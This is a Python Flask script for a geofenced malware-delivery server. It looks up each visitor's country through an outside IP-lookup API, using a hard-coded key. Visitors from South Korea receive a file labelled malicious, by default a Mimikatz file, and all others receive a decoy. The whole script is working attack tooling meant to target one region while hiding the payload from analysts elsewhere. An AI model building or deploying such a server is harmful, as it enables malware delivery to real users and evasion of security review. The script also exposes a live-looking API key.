from flask import Flask, request, send_file
import requests
import os

app = Flask(__name__)

@app.route('/')
def home():
    remote_addr = request.remote_addr
    api_param = {"key": "me58wbfwetp7mmq7is1fkqcgxcot", "host": remote_addr}
    
    res = requests.get(url="https://api.itforest.net/ipinfo", params=api_param)
    
    country_code = res.json()["data"].get("country_code", None)
    print(f'[*] remote_addr: {remote_addr}, country: {country_code}')

    if country_code == "KR":
        path = malicious_file

    else:
        path = none_malicious_file

    return send_file(path, as_attachment=True)

if __name__ == '__main__':
    malicious_file = os.environ.get("MALICIOUS_FILE_PATH", "./files/mimikatz.txt")
    none_malicious_file = os.environ.get("NONE_MALICIOUS_FILE_PATH", "./files/none_maliicious_file.txt")

    print(f"[*] Malicious file is --> {malicious_file}")
    print(f"[*] None malicious file is --> {none_malicious_file}")
    
    app.run(host='0.0.0.0', port=80)